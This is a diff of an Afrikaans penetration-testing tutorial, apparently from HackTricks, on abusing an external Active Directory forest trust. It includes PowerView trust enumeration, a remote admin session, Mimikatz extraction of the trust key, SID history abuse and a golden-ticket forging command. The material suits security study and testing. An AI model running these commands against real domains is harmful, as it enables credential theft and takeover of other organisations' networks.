@@ -1,13 +1,13 @@
-# Eksterne Woud-domein - Eenrigting (Inkomend) of bidireksioneel
+# Eksterne Bosdomein - Eenrigting (Inkomend) of bidireksioneel
 
 {{#include ../../banners/hacktricks-training.md}}
 
 In hierdie scenario vertrou 'n eksterne domein jou (of albei vertrou mekaar), sodat jy 'n soort toegang daaroor kan verkry.
 
-## Opname
+## Enumerasie
 
-Eerstens moet jy die **vertroue** **opneem**:
-```powershell
+Eerstens moet jy die **vertroue** **enumerate**:
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -60,10 +60,10 @@ In die vorige opsomming is gevind dat die gebruiker **`crossuser`** binne die **
 
 ## Begin Toegang
 
-As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om te **privesc vanaf 'n nie-bevoorregte gebruiker** (goed soos kerberoasting byvoorbeeld):
+As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om **privesc van 'n onprivilegieerde gebruiker** te doen (goed soos kerberoasting byvoorbeeld):
 
 Jy kan **Powerview funksies** gebruik om die **ander domein** te **opsom** met die `-Domain` param soos in:
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,23 +75,23 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Aanmelding
 
 Deur 'n gewone metode te gebruik met die geloofsbriewe van die gebruikers wat toegang het tot die eksterne domein, behoort jy toegang te hê tot:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID Geskiedenis Misbruik
 
 Jy kan ook [**SID Geskiedenis**](sid-history-injection.md) oor 'n woud vertroue misbruik.
 
-As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om **'n SID van die ander woud** by te voeg, en hierdie **SID** sal **bygevoeg** word tot die **gebruiker se token** wanneer hulle **oor die vertroue** autentiseer.
+As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om **'n SID van die ander woud** by te voeg, en hierdie **SID** sal by die **gebruiker se token** gevoeg word wanneer hulle **oor die vertroue** autentiseer.
 
 > [!WARNING]
 > Ter herinnering, jy kan die ondertekeningssleutel kry met
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die gebruiker van die huidige domein naboots**.
+Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die** gebruiker van die huidige domein **naboots**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
